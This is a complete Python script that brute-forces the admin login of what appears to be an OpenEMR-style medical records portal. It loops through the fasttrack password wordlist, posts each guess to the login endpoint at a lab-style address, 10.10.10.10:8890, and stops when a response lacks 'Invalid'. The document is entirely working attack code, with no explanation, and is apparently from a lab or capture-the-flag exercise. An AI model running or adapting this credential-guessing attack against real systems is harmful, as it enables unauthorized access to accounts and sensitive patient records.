#!/usr/bin/env python3

import requests

def main():
    wordlist_file = open("/usr/share/wordlists/fasttrack.txt", "r", encoding="ISO-8859-1")
    potential_pass = wordlist_file.read().splitlines()
    plen = len(potential_pass)
    count = 0

    for i in potential_pass:
        attempt_login(i)
        count = count + 1
        if count % 50 == 0:
            print(f'[!] {count} out of {plen}')

    wordlist_file.close()

def attempt_login(pw):
    s = requests.Session()
    
    ip = "10.10.10.10:8890"

    url = "http://" + ip + "/portal/interface/main/main_screen.php?auth=login&site=default"
    url2 = "http://" + ip + "/portal/interface/login_screen.php?error=1&site="
    url3 = "http://" + ip + "/portal/interface/login/login.php?site=default"
    url4 = "http://" + ip + "/portal/interface/product_registration/product_registration_controller.php"

    headers = {"Content-Type" : "application/x-www-form-urlencoded"}
    data = "new_login_session_management=1&authProvider=Default&authUser=admin&clearPass=" + pw + "&languageChoice=1"
    #proxy = {"http" : "http://127.0.0.1:8080"}

    login = s.post(url, data=data, headers=headers)
    request2 = s.get(url2)
    get_result = s.get(url3)
    request4 = s.get(url4)

    if "Invalid" in get_result.text:
        print(f'[X] {pw}\t:\tFailed')
    else:
        print(f'[!] {pw}\t:\tSuccess')
        exit()

if __name__ == "__main__":
    main()